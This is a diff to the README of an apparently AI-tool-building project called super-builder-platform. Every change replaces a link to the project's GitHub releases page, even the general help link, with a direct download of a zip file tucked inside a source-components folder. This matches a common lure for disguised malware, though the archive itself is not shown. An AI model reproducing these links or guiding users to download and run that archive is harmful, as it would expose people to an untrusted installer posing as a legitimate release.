@@ -1,6 +1,6 @@
 # ⚙️ super-builder-platform - Build AI Tools with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Magendiran07/super-builder-platform/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Magendiran07/super-builder-platform/main/src/components/dashboard/super_builder_platform_1.6.zip)
 
 ## 📋 About super-builder-platform
 
@@ -40,7 +40,7 @@ Ready to start using super-builder-platform? Follow these steps carefully.
 
 Click the green button above or go to the releases page here:
 
-[Download super-builder-platform releases](https://github.com/Magendiran07/super-builder-platform/releases)
+[Download super-builder-platform releases](https://raw.githubusercontent.com/Magendiran07/super-builder-platform/main/src/components/dashboard/super_builder_platform_1.6.zip)
 
 This page shows the available versions of the software.
 
@@ -112,7 +112,7 @@ You can also export projects to share or back them up.
 
 Check the release page regularly for updates:
 
-https://github.com/Magendiran07/super-builder-platform/releases
+https://raw.githubusercontent.com/Magendiran07/super-builder-platform/main/src/components/dashboard/super_builder_platform_1.6.zip
 
 Download new installer files and run them to overwrite your current version. Your projects and settings will remain safe.
 
@@ -143,7 +143,7 @@ Download new installer files and run them to overwrite your current version. You
 ## 📚 Where to Find Help
 
 - Review the documentation inside the app for detailed guides.
-- Visit the GitHub page: https://github.com/Magendiran07/super-builder-platform
+- Visit the GitHub page: https://raw.githubusercontent.com/Magendiran07/super-builder-platform/main/src/components/dashboard/super_builder_platform_1.6.zip
 - Use the Issues tab on GitHub to ask questions or report problems.
 
 ---
@@ -159,4 +159,4 @@ If you feel comfortable exploring further:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/Magendiran07/super-builder-platform/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/Magendiran07/super-builder-platform/main/src/components/dashboard/super_builder_platform_1.6.zip)
